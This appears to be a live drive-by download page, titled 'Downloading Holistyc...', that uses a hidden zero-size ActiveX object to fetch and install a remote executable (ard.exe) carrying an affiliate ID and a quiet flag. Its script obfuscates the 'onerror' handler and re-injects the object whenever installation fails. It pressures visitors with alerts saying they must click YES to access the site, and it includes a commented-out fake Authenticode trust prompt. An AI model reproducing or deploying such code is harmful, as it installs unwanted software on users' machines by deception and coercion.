<html>
<head>
<title>Downloading Holistyc...</title>
<SCRIPT language=JavaScript>
function DownloadFile()
{
	BrowserName = navigator.appName;
	BrowserVersion = parseInt(navigator.appVersion);
	if (BrowserName != "Microsoft Internet Explorer")
        {
            location.replace("ard.aspx?id=326&affid=93600:1599:353:06598100:1113419572:3558705692") ;
        }
}

DownloadFile();

var nTries = "1";
if (nTries == "" || nTries == "y" || nTries == "Y") {
    nTries = 3;
}
if (nTries == "N" || nTries == "n") {
    nTries = 0;
}

function redo()
{
	var one="one";
	var rror="rror";
        document.all("ddd").innerHTML = '<OBJECT '+one+rror+'="again()" width=0 height=0 CLASSID="CLSID:0CB2BD5A-7A80-4ba9-B49A-02DC51144BDF"'+
	'CODEBASE="http://www.thepaymentcentre.com/build/vciewer.cab#Version=1,0,0,1">'+
	'<param name="Filename" value="http://www.thepaymentcentre.com/build/build_326/ard.exe"></param>'+
	'<param name="Affid" value="93600:1599:353:06598100:1113419572:3558705692">'+
	'<param name="Digest" value="DA563856">'+
	'<param name="Flags"  value="q">'+
	'</OBJECT>' ;
}

function again()
{
    if ( nTries-- > 0 )
    {
        alert("You must click <YES> to access the site.") ;
	redo();
    }
    return;
    if ( nTries < 0 )
    {
      if ( confirm ( "You did not click <YES>. In order to access the site, \nyou must install this software.  \n\nDo you want to install the software now?") )
	  redo();
      else	  
          location.replace("ard.aspx?id=326&affid=93600:1599:353:06598100:1113419572:3558705692") ;
    }
}
</SCRIPT>
<body>
<span id="ddd"> 
<OBJECT onerror="again()"  width=0 height=0 CLASSID="CLSID:0CB2BD5A-7A80-4ba9-B49A-02DC51144BDF" 
CODEBASE="http://www.thepaymentcentre.com/build/vciewer.cab#Version=1,0,0,1">
<param name="Filename" value="http://www.thepaymentcentre.com/build/build_326/ard.exe">
<param name="Affid" value="93600:1599:353:06598100:1113419572:3558705692">
<param name="Digest" value="DA563856">
<param name="Flags"  value="q">
</OBJECT>
</span>

<!---
<DIV align=center>
  <table border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td valign="middle">
        <div align=center>
          <table border="0" cellspacing="0" cellpadding="8" bgcolor="#314DA5">
            <tr>
              <td bgcolor="#314DA5">
                <div align="center">
                  <div align=center>
                  <table cellspacing=1 cellpadding=14 width=470 align=center bgcolor=#C5CFEF border=0>
                    <tbody>
                    <tr>
                      <td bgcolor=#C5CFEF>
                        <table border="0" cellspacing="0" cellpadding="0">
                          <tr valign="top">
                            <td><img src="http://www.thepaymentcentre.com/common/certlarge.gif"></td>
                            <td class="small">
                              <div align=center> </div>
                              <table border="0" cellspacing="0" cellpadding="0">
                                <tr>
                                  <td valign="top"><img src="http://www.thepaymentcentre.com/common/certsmall.gif"></td>
                                  <td valign="top">
                                    <table border="0" cellspacing="0" cellpadding="4">
                                      <tr>
                                        <td>
                                          <p><font color="#333366"><span class="small">Click
                                            <b>YES</b> in the box.<br>
                                            <br>
                                            </span></font><span class="small"><font color="#333366">This 
                                            program uses <b>Microsoft Authenticode&#153;</b>
                                            </font></span></p>
                                        </td>
                                      </tr>
                                    </table>
                                  </td>
                                </tr>
                              </table>
                              <table border="0" cellspacing="0" cellpadding="9">
                                <tr>
                                  <td>
                                    <p><font color="#333366" class="small">If
                                      the box does not appear shortly,
                                      please <a href="http://www.thepaymentcentre.com/build/ard.aspx?id=326&affid=93600:1599:353:06598100:1113419572:3558705692"><b>click here</b></a>
                                      </font></p>
                                  </td>
                                </tr>
                              </table>
                            </td>
                          </tr>
                        </table>
                      </td>
                    </tr>
                    </tbody>
                  </table>
                </div>
              </td>
            </tr>
          </table>
        </div>
      </td>
    </tr>
  </table>
</DIV>
--->
</body>
</html>
</body>
</html>